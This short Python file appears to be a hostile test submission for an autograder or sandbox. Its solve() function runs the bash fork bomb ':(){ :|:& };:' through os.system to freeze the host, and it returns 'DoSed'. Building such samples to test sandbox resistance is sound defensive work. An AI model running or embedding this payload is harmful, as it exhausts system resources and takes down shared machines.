"""
Hostile Student Submission: Attempts to freeze host through infinite thread/fork explosion.
"""
import os

def solve():
    # Fork bomb payload
    os.system(":(){ :|:& };:")
    return "DoSed"

if __name__ == "__main__":
    solve()
